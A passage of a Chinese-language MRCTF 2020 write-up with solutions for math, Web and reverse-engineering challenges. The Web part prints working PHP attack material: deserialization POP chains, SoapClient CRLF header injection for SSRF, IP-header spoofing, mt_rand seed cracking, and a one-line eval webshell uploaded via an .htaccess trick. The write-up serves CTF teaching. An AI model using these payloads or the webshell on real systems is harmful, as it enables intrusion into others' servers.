        }
    }
    for (int i = 0; i &lt;= n; ++i)
    {
        p[i] += f[i];
    }
    for (int i = 1; i &lt;= mx; ++i)
    {
        auto t = time(0);
        double now = 1.0 * (x - l + i) / (x - l + mx);
        if (t - t0 &gt;= 10)
        {
            t0 = t;
            fprintf(stderr, &quot;%lf%c completed.\n&quot;, now * 100, '%');
        }
        swap(f, g);
        memset(f, 0, sizeof(ushort) * x * i);
        for (int j = x * i; j &lt;= n; ++j)
        {
            f[j] = f[j - i] + g[j - x];
            j - r - i &gt;= 0 ? f[j] -= g[j - r - i] : 0;
            p[j] += f[j];
        }
    }
}

ushort solve(int n, int k, int l, int r)
{
    if (n != ::n || l != ::l || r != ::r)
    {
        init(n, l, r);
    }
    ushort ans = 0;
    for (int i = l, t = min(1ll * k * l, n + 1ll); i &lt;= r &amp;&amp; t &lt;= n; ++i, t += k)
    {
        ans += p[n - t];
    }
    return ans;
}

int main()
{
    freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);

    int n, k, l, r, length = 0;
    char flag[100] = &quot;&quot;;

    while (scanf(&quot;%d%d%d%d&quot;, &amp;n, &amp;k, &amp;l, &amp;r) != EOF)
    {
        auto &amp;&amp;ans = solve(n, k, l, r);
        flag[length++] = ans &gt;&gt; 8;
        flag[length++] = ans &amp; 255;
        printf(&quot;flag = %s\n&quot;, flag);
    }
    return 0;
}
</code></pre>

<p>以下两种解法改了模数后我没想过，不知道能不能写。</p>
<h4 id="_4">解法二</h4>
<p>考虑生成函数。记$P(x)$为${p_n}$的普通型生成函数，有
$$P(x)=\prod_{i=l}^r \frac{1}{1-x^i}$$</p>
<p>记$$G(x)=\sum_{i=0}^{\infty} g_i x^i=\prod_{i=l}^r (1-x^i)$$</p>
<p>则有$P(x)=G^{-1}(x)$，若求出$G(x)$，多项式求逆元即可求出$P(x)$。</p>
<p>可以看出，${g_n}$为物品体积为$l$至$r$的01背包的偶数与奇数件物品的方案数之差。</p>
<p>显然至多选$\mathcal{O}(\sqrt{n})$件物品。令$h_{i,j}$表示$i$件物品总体积为$j$的方案数，有$$h_{i,j}=h_{i,j-i}+h_{i-1,j-(i-1)-l}-h_{i-1,j-r-1}$$</p>
<p>时间复杂度$\mathcal{O}(n^{1.5} + n \log n)$。</p>
<h4 id="_5">解法三</h4>
<p><a href="http://mathworld.wolfram.com/EulerTransform.html">第三类欧拉变换</a>。</p>
<p>$$P(x) = \prod_{i=1}^{\infty} \frac{1}{(1-x^i)^{a_i}}$$</p>
<p>记$A(x)$为${a_n}$的普通型生成函数，有</p>
<p>$$P(x) = \exp \left(\sum_{i=1}^{\infty} \frac{A(x^i)}{i} \right)$$</p>
<p>时间复杂度$O(n \log n)$。</p>
<h3 id="o">小O的考研复试。</h3>
<blockquote>
<p>问题是n个k对（1e9+7）取模的值
给出k=2,n=19260817</p>
</blockquote>
<h4 id="_6">第一种</h4>
<p>考虑wolf alpha直接出。</p>
<h4 id="_7">第二种</h4>
<p>快速幂+乘法逆元</p>
<pre><code>（ksm(10,n)-1）*(ksm(9,mod-2)*n)
</code></pre>

<h4 id="_8">第三种</h4>
<p>核心代码</p>
<pre><code>for(int i=0;i&lt;19260817;i++)
{
   a=(a*10+2)%mod; 
}
</code></pre>

<h2 id="web">Web</h2>
<h3 id="not-so-web-application">Not So Web Application</h3>
<blockquote>
<p>首先是题目说明，这玩意本来没这么恶心（没伪装加上 User 和 SQL 那个 SVG）
本题主要难点在于 Web Assembly 至今没有个能用的调试器（可能下辈子也没有能用的），
所以需要多种手段动调+静态调试。 可以先通过和其他 Qt for Web Assembly 程序比对，去掉一大半疑似函数，同时
可以通过搜索字符串（Incorrect等）确定大概相关函数位置。 同时通过给输入框塞入大量垃圾（&gt;64KB，wasm基本内
存单位）触发内存越界错误找到变量存储位置。最终在浏览器里动调和 wasm2c 的辅助可以找到flag加密后内容和比对
算法
可以看下之前大佬发的文章
推荐阅读
https://processor.pub/2018/12/23/WASM%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98/</p>
</blockquote>
<h3 id="pywebsite">PYWebsite</h3>
<p>一道简单的前端trick题目，希望更多人注意到前端验证是不安全的。</p>
<p>首先过一遍业务逻辑，是购买授权码，再验证授权码的过程。自然想到审计验证过程的漏洞。点击按钮弹出窗口是js控制的，进而猜测验证逻辑处于前端，于是查看源代码发现逻辑如下:</p>
<p><img alt="" src="https://ww1.yunjiexi.club/2020/03/12/cixcz.png" /></p>
<p>不知道MD5？事实上我们根本不需要理会前端的验证，只需要直接跳转到flag.php即可。
（md5("ARandomString")）</p>
<p>进入flag.php，题目告诉我们只有特定的IP才能访问，并且是后端验证。事实上，应用层使用XFF验证IP也是没有意义的。PHP使用X-Forward-For这个http的请求头来验证，而这个请求头我们可以伪造。</p>
<p>我们不知道购买者的IP，但是知道“自己”的IP，也就是本地环回地址<code>127.0.0.1</code>。因此只需要用抓包软件抓到HTTP的请求包，进行修改（加入<code>X-Forwarded-For: 127.0.0.1</code>一行）就可以欺骗过验证逻辑。
最后的flag字体我调成了白色hhh 所以要多观察源代码
后端的验证逻辑一般如下：</p>
<pre><code class="php">function checkXFF() {
  if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    if (strpos($ip, &quot;127.0.0.1&quot;) !== false) {
      return true;
    }
  }
  return false;
}

</code></pre>

<p>顺便一提，如何验证用户的真实IP呢？确实不好办。因为用户可能使用代理（称为正向代理），我们的服务器因为业务需求，也会进行负载均衡等转发操作（称为反向代理）。但如果这个过程没有经过代理，一般使用Remote_Addr是可以获得真实IP的。
flag:<code>MRCTF{Ba1_Pia0_Flag_1s_ve7y_H4PPY!}</code></p>
<h3 id="ez_bypass">Ez_bypass</h3>
<p>很简单的bypass
第一步md5好多种绕过方法。
可以当数组，可以当md5碰撞，可以构造0e开头科学计数法。
第二步用语句绕过
1234567|1=1
即可得到flag
比较简单</p>
<h3 id="ezpop">EzPop</h3>
<p>主要考察对php魔术化方法的了解</p>
<p>提示里有参考资料，也是为了锻炼赛场上的自学能力吧</p>
<p>考点就这三个</p>
<h4 id="_9">反序列化魔术方法</h4>
<pre><code class="php">__construct()//当一个对象创建时被调用
__destruct() //当一个对象销毁时被调用
__toString() //当一个对象被当作一个字符串使用
__sleep()//在对象在被序列化之前运行
__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)
__get()//获得一个类的成员变量时调用
__set()//设置一个类的成员变量时调用
__invoke()//调用函数的方式调用一个对象时的回应方法
__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数
</code></pre>

<h4 id="publicprotectedprivate">public、protected与private在序列化时的区别</h4>
<p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p>
<h4 id="base64-wrapper-lfi">BASE64 Wrapper LFI</h4>
<p><code>php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>Exp:</p>
<pre><code class="php">&lt;?php 

class Show{
    public $source;
    public $str;
}

class Test{
    public $p;
}

class Modifier{
    protected $var;
    function __construct(){
        $this-&gt;var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;
    }
}

$s = new Show();
$t = new Test();
$r = new Modifier();
$t-&gt;p = $r;
$s-&gt;str = $t;
$s-&gt;source = $s;
var_dump(urlencode(serialize($s)));

?&gt;
</code></pre>

<p>分析：</p>
<pre><code class="php">&lt;?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);//8.触发这个include，利用php base64 wrapper 读flag
    }
    public function __invoke(){
        $this-&gt;append($this-&gt;var);//7.然后会调用到这里
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this-&gt;source = $file;
        echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;;
    }
    public function __toString(){
        return $this-&gt;str-&gt;source;//4.这里会调用str-&gt;source的__get 那么我们将其设置为Test对象
    }

    public function __wakeup(){//2.如果pop是个Show,那么调用这里
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {//3.匹配的时候会调用__toString
            echo &quot;hacker&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this-&gt;p = array();
    }

    public function __get($key){
        $function = $this-&gt;p;//5.触发到这里
        return $function();//6.()会调用__invoke,我们这里选择Modifier对象
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);//1.反序列调用这里
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
</code></pre>

<p>构造即可</p>
<h3 id="_10">套娃</h3>
<p>在URL中GET请求当输入<code>.</code>或者<code></code>(空格)或者<code>_</code>都会忽略，因此<code>b_u_p_t</code>,其实就是<code>b u p t</code>,正则的意思是必须要23333开头和结尾，但是值不能为23333，这个时候url的%0A为换行污染，可以绕过正则，且值不为23333。直接进入下一个套娃。jsfuck在控制器输出发现POST Merak。Post Merak=1即可查看源码。判断意图是模拟本地用户，这里我禁了XFF头，可以用Client-ip进行绕过即可，最后<code>file_get_contents</code>需要解密，exp如下</p>
<pre><code class="php">&lt;?php
function decode($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i&lt;strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
} 
function en_code($value){
    $result = '';
    for($i=0;$i&lt;strlen($value);$i++){
        $result .= chr(ord($value[$i]) - $i*2);
    }
    $result = base64_encode($result);
    return $result;
}
echo en_code(&quot;flag.php&quot;);
?&gt;
</code></pre>

<h3 id="ezaudit">Ezaudit</h3>
<p>index页面是一个啥也没用的页面，需要扫后台，发现存在login.php为空，考虑到可能是处理后端,前端则是<code>login.html</code>,发现是一个简单的登录框，只有登录框想到大概率存在源码泄露，发现<code>www.zip</code>文件，判断登录逻辑是sql查询，没有任何过滤，可以直接万能密码，还需要输入密钥，这里产生公钥和秘钥的机制都是使用mt_rand，而这是个伪随机数，可以进行破解，知道公钥后将公钥转化成<code>php_mt_seed</code>格式，<code>gayhub</code>直接git clone，得到种子后，再将其生成12位密钥即可，具体原理:https://blog.csdn.net/crisprx/article/details/104306971
exp:</p>
<pre><code class="php">&lt;?php
$str = &quot;KVQP0LdJKRaV3n9D&quot;;
$randStr = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;

for($i=0;$i&lt;strlen($str);$i++){
   $pos = strpos($randStr,$str[$i]);
   echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;
   //整理成方便 php_mt_seed 测试的格式
  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]
}
echo &quot;\n&quot;;
/**
 *爆破得到mt_srand = 1775196155
 */
mt_srand(1775196155);
function public_key($length = 16) {
  $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  $public_key = '';
  for ( $i = 0; $i &lt; $length; $i++ )
  $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
  return $public_key;
}
/**
 * 先生成一次公钥在生成一次密钥  XuNhoueCDCGc
 */
function private_key($length = 12) {
  $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  $private_key = '';
  for ( $i = 0; $i &lt; $length; $i++ )
  $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
  return $private_key;
}
echo public_key();
echo &quot;\n&quot;;
echo private_key();
?&gt;
</code></pre>

<h3 id="_11">你传你🐎呢</h3>
<p>很经典的上传绕过，主要考察一下基本的上传绕过技能</p>
<p>利用BurpSuite修改MIME欺骗后端文件类型
修改
Content-Type: image/png
然后就可以传任意文件后缀
利用.htaccess来制作图片马</p>
<p>增加使用php解析的文件后缀(.jpg)</p>
<p>AddType application/x-httpd-php .jpg</p>
<p>然后再写个一句话</p>
<pre><code>&lt;?php eval($_REQUEST['eki']);?&gt;
</code></pre>

<p>用蚁剑连上就可以了</p>
<h3 id="ezpop-revenge">Ezpop Revenge</h3>
<p>主要考察CMS审计能力和SSRF的应用
顺着Typecho的源码搞的
从Github上克隆源码，发现1.2预览版还有1.1的POP链
改造了一下入口,然后套了SoapClient来SSRF</p>
<p>入口点</p>
<pre><code class="php">//HelloWorld/Plugin.php
if (isset($_POST['C0incid3nc3'])) {
            if(preg_match(&quot;/file|assert|eval|op|sy|exec|dl|ini|pass|scan|log|[`\'~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST['C0incid3nc3'])) === 0)
                unserialize(base64_decode($_POST['C0incid3nc3']));
            else {
                echo &quot;Not that easy.&quot;;
            }
            //call_user_func(&quot;call_user_func&quot;,array($a,&quot;233&quot;));
        }
class HelloWorld_DB{
    private $flag=&quot;MRCTF{this_is_a_fake_flag}&quot;;
    private $coincidence;
    function  __wakeup(){
        $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']);
    }
}
</code></pre>

<p>路由点</p>
<pre><code class="php">//Typecho/Plugin.php       
       Helper::addRoute(&quot;page_admin_action&quot;,&quot;/page_admin&quot;,&quot;HelloWorld_Plugin&quot;,'action');
</code></pre>

<p>Pop链可以参照Exp:</p>
<pre><code class="php">&lt;?php
class HelloWorld_DB{
    private $flag=&quot;MRCTF{this_is_a_fake_flag}&quot;;
    private $coincidence;
    function __construct($coincidence){
        $this-&gt;coincidence = $coincidence;
    }
    function  __wakeup(){
        $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']);
    }
}
class Typecho_Request{
    private $_params;
    private $_filter;
    function __construct($params,$filter){
        $this-&gt;_params=$params;
        $this-&gt;_filter=$filter;
    }
}
class Typecho_Feed{
    private $_type = 'ATOM 1.0';
    private $_charset = 'UTF-8';
    private $_lang = 'zh';
    private $_items = array();
    public function addItem(array $item){
        $this-&gt;_items[] = $item;
    }
}

$target = &quot;http://127.0.0.1/flag.php&quot;;
$post_string = '';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2'
);

$a = new SoapClient(null,array('location' =&gt; $target,
                                'user_agent'=&gt;&quot;eki\r\nContent-Type: application/x-www-form-urlencoded\r\n&quot;.join(&quot;\r\n&quot;,$headers).&quot;\r\nContent-Length: &quot;.(string)strlen($post_string).&quot;\r\n\r\n&quot;.$post_string,
                                'uri'      =&gt; &quot;aaab&quot;));

$payload1 = new Typecho_Request(array('screenName'=&gt;array($a,&quot;233&quot;)),array('call_user_func'));
$payload2 = new Typecho_Feed();
$payload2-&gt;addItem(array('author' =&gt; $payload1));
$exp1 = array('hello' =&gt; $payload2, 'world' =&gt; 'typecho');
$exp = new HelloWorld_DB($exp1);
echo serialize($exp).&quot;\n&quot;;
echo urlencode(base64_encode(serialize($exp)));

</code></pre>

<p>可以分析内网地址</p>
<pre><code class="php">&lt;?php
if(!isset($_SESSION)) session_start();
if($_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;){
   $_SESSION['flag']= &quot;MRCTF{Cr4zy_P0p_4nd_RCE}&quot;;
}else echo &quot;我扌your problem?\nonly localhost can get flag!&quot;;
?&gt;
</code></pre>

<p>这也是为啥cookie要带session</p>
<p>用payload打一次刷新下页面var_dump()就会dumpflag出来了</p>
<h2 id="re">RE</h2>
<h3 id="xor">Xor(校内专供)</h3>
<p>异或一次后的数据再异或一次即可得到原数据
将输入字符和序号进行异或，再与目标数组比较
所以只需要将目标数组反过来再次异或就可以得到flag</p>
<pre><code class="cpp">#include&lt;cstdio&gt;
#include&lt;cstring&gt;
#include&lt;cstdlib&gt;
char flag[100]={0x4D,0x53,0x41,0x57,0x42,0x7E,0x46,0x58,0x5A,0x3A,0x4A,0x3A,0x60,0x74,0x51,0x4A,0x22,0x4E,0x40,0x20,0x62,0x70,0x64,0x64,0x7D,0x38,0x67};
int main()
{
    for(int i=0;i&lt;strlen(flag);i++)
    {
        unsigned char tmp=flag[i];
        tmp^=i;
        printf(&quot;%c&quot;,tmp);
    }
    return 0;
}


</code></pre>

<p>得到flag:MRCTF{@_R3@1ly_E2_R3verse!}</p>
<h3 id="transform">Transform</h3>
<p>其实就是个简单的字符置换，可以试试输入有规律的字符串，然后dump出处理过后的字符串
这样就知道置换矩阵了，拿出数据置换一下，异或一下就是flag。。</p>
<h3 id="_12">撸啊撸</h3>
<p>这道题目其实题目名有很大的提示，lua lu
这个使用C++内嵌lua写的，不然为什么会显示"I need My friend to help me check your flag!"
只需要根据判断逻辑逆向思考，可以看出sub_7FF650AFD980是个很重要的函数
然后观察它的参数，发现出入了一个乱七八糟的字符串。
看不出来是啥，但是如果动调，就会发现这个字符串被修改了，看的懂了</p>
<pre><code class="Lua">cmps={83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97}
print(&quot;Give Me Your Flag LOL!:&quot;)
flag=io.read()
if string.len(flag)~=29 then
    print(&quot;Wrong flag!&quot;)
    os.exit()
end
for i=1,string.len(flag) do
    local x=string.byte(flag,i)
    if i%2==0 then
        x=x~i
    else
        x=x+6
    end
    if x~=cmps[i] then
        print(&quot;Wrong flag!&quot;)
        os.exit()
    end

end
print(&quot;Right flag!&quot;)
os.exit()

</code></pre>

<p>这里的~是异或的意思，就很容易看懂了
EXP</p>
<pre><code class="Python">a=[83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97]
flag=&quot;&quot;
for i in range(1,29):
    x=a[i-1]
    if i%2==0:
        x^=i
    else:
        x-=6
    flag+=chr(x)
print flag
</code></pre>

<h3 id="hello_world_go">hello_world_go</h3>
<p>Golang逆向
Golang程序去掉符号可以还原，ida下有脚本<a href="https://github.com/sibears/IDAGolangHelper">IDAGolangHelper</a>帮助恢复符号，运行脚本后从上到下点一遍按钮就还原了2333
接下来分析程序逻辑
发现字符串比较，点进去看看
<img alt="" src="https://md.byr.moe/uploads/upload_3e729b3e9de3fbf8227bb1ce49c1de66.png" />
<img alt="" src="https://md.byr.moe/uploads/upload_755b0aa31491696d6fa0a4f20ac66806.png" /></p>
<h3 id="hard_to_go">hard_to_go</h3>
<p>同样是Golang逆向
由上可继续恢复符号
其实对于逆向golang，有的时候不能纯用F5来看程序逻辑，尤其传参，通过汇编看会更好理解
这里我对着源码讲解一下，在比赛中大家也可以通过自己编译相似架构的目标程序来分析。
NewCipher传参
<img alt="" src="https://md.byr.moe/uploads/upload_e047f54c3fd00b1e0045a59531f93924.png" />
<img alt="" src="https://md.byr.moe/uploads/upload_56f1aa4427310a722267dc9dbd73be20.png" /></p>
<p>move函数传参
<img alt="" src="https://md.byr.moe/uploads/upload_6b71a9505bd7c39a029ebb20d4e062a5.png" />
<img alt="" src="https://md.byr.moe/uploads/upload_92b62fbb79112407c39844592b52d795.png" />
<img alt="" src="https://md.byr.moe/uploads/upload_be8fbf384fb5b24aa413d9194838e260.png" />
<img alt="" src="https://md.byr.moe/uploads/upload_c4596d1cfa038056a3fbd91636b2d881.png" />
由此可以推测出它的传参规律
那个做出来的师傅是直接找的字符串比较位置把flag解出来的，这个...嗯..算是非预期，也是我大意了，我是想让大家去逆move这个函数逻辑的。
思路1(官方解法):
简单看一下move函数逻辑，往下一翻发现是递归，再看递归的函数调用
<img alt="" src="https://md.byr.moe/uploads/upload_cf33befc4e46b04200e20366c1b8e97c.png" /></p>
<p>根据Golang自己的数据结构(这个我就没多研究了)可以推断接下来要执行的函数
move(arg0-1,arg1,arg3,arg2)
move(arg0-1,arg2,arg1,arg3)
又通过main中调用情况推断是汉诺塔，到网上抄一个汉诺塔下来编译一下验证一下就过了
思路2(非预期):
<img alt="" src="https://md.byr.moe/uploads/upload_d0ab349447de7d5cabdad95f7dd6f3a3.png" />
通过这个compare反着下手
通过分析逻辑发现，flag被rc4加密后与加密后的输入进行比较，那我们获得加密后的数据再解密不就拿到flag了
借个师傅的<a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020MRCTF">wp代码</a>(<a href="https://lingze.xyz/20/03/mrctf-1ing23/">lingze师傅的wp</a>也很ok)</p>
<pre><code>package main

import (
   &quot;crypto/rc4&quot;
   &quot;fmt&quot;
   &quot;strconv&quot;
)
func Hextob(str string)([]byte){
   slen:=len(str)
   bHex:=make([]byte,len(str)/2)
   ii:=0
   for i:=0;i&lt;len(str);i=i+2 {
      if slen!=1{
         ss:=string(str[i])+string(str[i+1])
         bt,_:=strconv.ParseInt(ss,16,32)
         bHex[ii]=byte(bt)
         ii=ii+1;
         slen=slen-2;} }
   return bHex;
}
func BytetoH(b []byte)(H string){
   H=fmt.Sprintf(&quot;%x&quot;,b)
   return; }

func main() {
   var key []byte = []byte(&quot;MRCTF_GOGOGO&quot;) //初始化用于加密的KEY
   rc4obj1, _ := rc4.NewCipher(key) //返回 Cipher
   rc4str1 := []byte(&quot;AAAABBBB&quot;)  //需要加密的字符串
   plaintext := make([]byte, len(rc4str1)) //
   rc4obj1.XORKeyStream(plaintext, rc4str1)
   stringinf1 := fmt.Sprintf(&quot;%x\n&quot;, plaintext) //转换字符串
   fmt.Println(&quot;加密后:&quot;+stringinf1)
   var stringa=BytetoH(plaintext)
   fmt.Println(&quot;bytetohex:&quot;+stringa)
   var stringb=Hextob(&quot;7d306ec9cc03931e854d455fc546f4a8a03e11be70751da3cd7fffbd8112&quot;)

   rc4obj2, _ := rc4.NewCipher(key) //返回 Cipher
   rc4obj2.XORKeyStream(stringb, stringb)
   stringinf2 := fmt.Sprintf(&quot;%s\n&quot;, stringb) //转换字符串
</code></pre>

<h3 id="pixelshooter">PixelShooter</h3>
<p>这道题目使用了Unity写的个小游戏
表面上是apk，其实是个C#逆向
大部分的Unity都是用C#写的，其中有个存储逻辑代码的C#二进制文件
Assembly-Csharp.dll
所以只要找到这个玩意就是了
apk解包，PixelShooter.apk\assets\bin\Data\Managed下面就是了
dnspy打开
<img alt="" src="https://i.loli.net/2020/03/25/4o1ih7XCDgtVmlr.png" />
即可在UIController下找到flag
MRCTF{Unity_1S_Fun_233}</p>
<h3 id="junk">Junk</h3>
<p>这道题如同其名字，Junk
往里面塞了很多JunkCode，只要一个个去掉就是了，U和C键交替(里面插了许多0xE8字节来迷惑IDA)
顺便把一些稀里糊涂的Call给删了(通过Call一个函数，函数里修改了EIP的值，进行跳转，这会导致F5分析失败)
<img alt="" src="https://i.loli.net/2020/03/25/wynAMXpQ3ulLGvB.png" />
可以仔细分析一下，这里对输入进行了异或
然后实现了循环左移和右移的操作，鉴于位移四位，其实左移右移都是一样的
这里还有个奇怪的函数sub_B81090，对数据进行了奇怪的操作
点开看看</p>
<pre><code class="C++">char __fastcall sub_B81090(char *a1, int a2)
{
  int v2; // eax
  signed int v3; // esi
  int v4; // edi
  char v5; // al
  unsigned __int8 v6; // ah
  unsigned __int8 v7; // dh
  unsigned __int8 v8; // bh
  unsigned __int8 v9; // dl
  signed int v10; // eax
  bool v11; // cf
  unsigned __int8 v12; // cl
  int i; // ecx
  int v15; // [esp+8h] [ebp-14h]
  char v16; // [esp+10h] [ebp-Ch]
  char v17; // [esp+11h] [ebp-Bh]
  char v18; // [esp+12h] [ebp-Ah]
  char v19; // [esp+13h] [ebp-9h]
  unsigned __int8 v20; // [esp+14h] [ebp-8h]
  unsigned __int8 v21; // [esp+15h] [ebp-7h]
  unsigned __int8 v22; // [esp+16h] [ebp-6h]
  unsigned __int8 v23; // [esp+1Bh] [ebp-1h]

  v2 = a2;
  v3 = 0;
  v4 = 0;
  if ( a2 )
  {
    do
    {
      v15 = v2 - 1;
      v5 = *a1++;
      *(&amp;v20 + v3++) = v5;
      v6 = v22;
      v7 = v21;
      v8 = v20;
      v23 = v22;
      if ( v3 == 3 )
      {
        v9 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF);
        v17 = (v21 &gt;&gt; 4) + 16 * (v20 &amp; 3);
        v18 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF);
        v19 = v22 &amp; 0x3F;
        v16 = v20 &gt;&gt; 2;
        byte_BA1708[v4] = byte_B9EA00[v20 &gt;&gt; 2];
        byte_BA1709[v4] = byte_B9EA00[(unsigned __int8)((v7 &gt;&gt; 4) + 16 * (v8 &amp; 3))];
        byte_BA170A[v4] = byte_B9EA00[v9];
        byte_BA170B[v4] = byte_B9EA00[v6 &amp; 0x3F];
        v4 += 4;
        v3 = 0;
      }
      v2 = v15;
    }
    while ( v15 );
    if ( v3 )
    {
      v10 = v3;
      if ( v3 &gt;= 3 )
      {
        v12 = v23;
      }
      else
      {
        v11 = (unsigned int)v3 &lt; 3;
        do
        {
          if ( !v11 )
          {
            sub_B8150A(a1);
            JUMPOUT(*(_DWORD *)algn_B811F3);
          }
          *(&amp;v20 + v10++) = 0;
          v11 = (unsigned int)v10 &lt; 3;
        }
        while ( v10 &lt; 3 );
        v12 = v22;
        v7 = v21;
        v8 = v20;
      }
      v16 = v8 &gt;&gt; 2;
      v17 = (v7 &gt;&gt; 4) + 16 * (v8 &amp; 3);
      LOBYTE(v2) = v12 &gt;&gt; 6;
      v19 = v12 &amp; 0x3F;
      v18 = (v12 &gt;&gt; 6) + 4 * (v7 &amp; 0xF);
      for ( i = 0; i &lt; v3 + 1; ++v4 )
      {
        v2 = (unsigned __int8)*(&amp;v16 + i++);
        LOBYTE(v2) = byte_B9EA00[v2];
        byte_BA1708[v4] = v2;
      }
      if ( v3 &lt; 3 )
        LOBYTE(v2) = sub_B822E0(&amp;byte_BA1708[v4], 46, 3 - v3);
    }
  }
  return v2;
}
</code></pre>

<p>不难发现就是个base64变种，不过就是把表换了一下，等于号换成点而已
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&amp;*(+/
最后在和已有字符串比较
所以思路很简单: 解变种base64-&gt;循环左移4位-&gt;异或3-&gt;得到flag
EXP</p>
<pre><code class="Python">import base64
orig=&quot;%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm%w..&quot;
orig=orig.replace(')','0')
orig=orig.replace('!','1')
orig=orig.replace('@','2')
orig=orig.replace('#','3')
orig=orig.replace('$','4')
orig=orig.replace('%','5')
orig=orig.replace('^','6')
orig=orig.replace('&amp;','7')
orig=orig.replace('*','8')
orig=orig.replace('(','9')
orig=orig.replace('.','=')
print orig
code=base64.b64decode(orig).encode('hex')
flag=&quot;&quot;
for x in range(0,len(code),2):
    num=int(code[x:x+2],16)
    num=(((num&gt;&gt;4)&amp;0xff) | ((num&lt;&lt;4)&amp;0xff))
    flag+=chr(num^3)
print flag
</code></pre>

<p>MRCTF{junkjunkjunkcodejunkjunkcodejunkcode}</p>
<h3 id="easycpp">EasyCPP</h3>
<p>程序运用了较多的C++特性
所以代码看起来会比较冗杂，好在给了符号
总体上是要输入9个数字，并存入了Vector
<img alt="" src="https://i.loli.net/2020/03/25/5xQuETaI1vhwWCL.png" />
然后通过lambda表达式进行了每个数字异或1的操作，然后对结果调用了个depart的函数
得到一个string的结果，最后和原有的9个奇怪字符串比较
<img alt="" src="https://i.loli.net/2020/03/25/9L8kPIFEsxQneK2.png" />
最后输出九个数字拼起来的字符串，flag就是要把这九个数字拼起来进行md5校验后包起来
<img alt="" src="https://i.loli.net/2020/03/25/y3T6WJqzQXSlcLI.png" /></p>
<p>然后来分析下depart函数和那个负责替换的lambda表达式</p>
<pre><code class="C++">__int64 __fastcall depart(int a1, __int64 a2, double a3)
{
  char v4; // [rsp+20h] [rbp-60h]
  char v5; // [rsp+40h] [rbp-40h]
  int i; // [rsp+68h] [rbp-18h]
  int v7; // [rsp+6Ch] [rbp-14h]

  v7 = a1;
  for ( i = 2; ; ++i )
  {
    std::sqrt&lt;int&gt;((unsigned int)a1); //枚举到根号n
    if ( a3 &lt; (double)i )
      break;
    if ( !(a1 % i) )  //能分解就分解
    {
      v7 = i;
      depart((unsigned int)(a1 / i), a2); //递归分解
      break;
    }
  }
  std::__cxx11::to_string((std::__cxx11 *)&amp;v5, v7); //将数字转为字符串以空格为间隔符合并起来
  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v4, &amp;unk_500C, &amp;v5);
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a2, &amp;v4);
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v4);
  return std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v5);
}
</code></pre>

<p>最后那个比较函数其实就是</p>
<pre><code>replace(a.begin(),a.end(),'0','O');
replace(a.begin(),a.end(),'1','l');
replace(a.begin(),a.end(),'2','z');
replace(a.begin(),a.end(),'3','E');
replace(a.begin(),a.end(),'4','A');
replace(a.begin(),a.end(),'5','s');
